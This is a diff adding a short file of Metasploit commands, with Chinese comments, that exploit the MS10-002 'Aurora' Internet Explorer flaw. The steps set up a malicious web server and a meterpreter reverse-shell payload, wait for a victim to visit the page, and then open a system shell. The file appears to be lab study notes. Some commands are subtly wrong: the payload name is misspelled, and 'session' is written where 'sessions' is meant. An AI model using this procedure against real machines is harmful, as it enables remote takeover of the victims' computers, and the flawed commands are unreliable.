@@ -1,0 +1,17 @@
+search ms10_002
+use exploit/windows/browser/ms10_002_aurora
+show options
+set SRVHOST 192.168.2.128    利用漏洞特性，请求对方访问自身，故为自身ip
+set payload windowmeterpreter/reverse_tcp 生成反弹shell
+set SRVPORT 80 设置端口（默认80）
+set URIPATH /  设置根路径
+set LHOST 192.168.2.128  设置监听本地ip地址（监听反弹shell）
+set LPORT 444 设置本地监听端口
+exploit
+
+等对面访问，出现会话则回车
+session -i    查看保存的会话
+session -i 1   选择这个会话
+进入meterpreter模式
+shell    获得系统权限
+exit 退出会话
